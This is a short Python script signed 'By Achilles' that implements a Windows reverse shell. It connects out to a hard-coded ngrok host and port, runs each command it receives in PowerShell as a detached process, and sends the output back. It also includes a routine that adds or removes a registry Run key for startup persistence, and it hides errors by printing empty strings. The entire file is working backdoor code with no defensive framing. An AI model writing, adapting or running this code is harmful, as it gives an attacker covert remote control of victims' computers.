import socket
import subprocess
import os
import sys
import platform
import winreg
#By Achilles
def set_startup_option(enable_startup):
    key = r'SOFTWARE\Microsoft\Windows\CurrentVersion\Run'
    script_path = os.path.abspath(sys.argv[0])
    if enable_startup:
        try:
            if platform.system() == 'Windows':
                with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key, 0, winreg.KEY_WRITE) as registry_key:
                    winreg.SetValueEx(registry_key, 'MyScript', 0, winreg.REG_SZ, script_path)
        except Exception as e:
            print("")
    else:
        try:
            if platform.system() == 'Windows':
                with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key, 0, winreg.KEY_WRITE) as registry_key:
                    try:
                        winreg.DeleteValue(registry_key, 'MyScript')
                    except FileNotFoundError:
                        pass
        except Exception as e:
            print("")
#By Achilles
set_startup_option(False)
#By Achilles
server_address = ('4.tcp.eu.ngrok.io', 12035)
#By Achilles
client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#By Achilles
client_socket.connect(server_address)
#By Achilles
while True:
    command = client_socket.recv(1024).decode()
    if command.lower() == 'exit':
        break
#By Achilles
    if command == 'newcmd':
        subprocess.run(["cmd.exe", "/K"], creationflags=subprocess.DETACHED_PROCESS | subprocess.CREATE_NEW_CONSOLE)
    else:
        try:
            result = subprocess.run(["powershell", "-Command", command], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, creationflags=subprocess.DETACHED_PROCESS)
            if result.returncode == 0:
                response = result.stdout
            else:
                response = "Error executing the command:\n" + result.stderr
        except Exception as e:
            response = "Error: " + str(e)
#By Achilles
        client_socket.send(response.encode())
#By Achilles
client_socket.close()
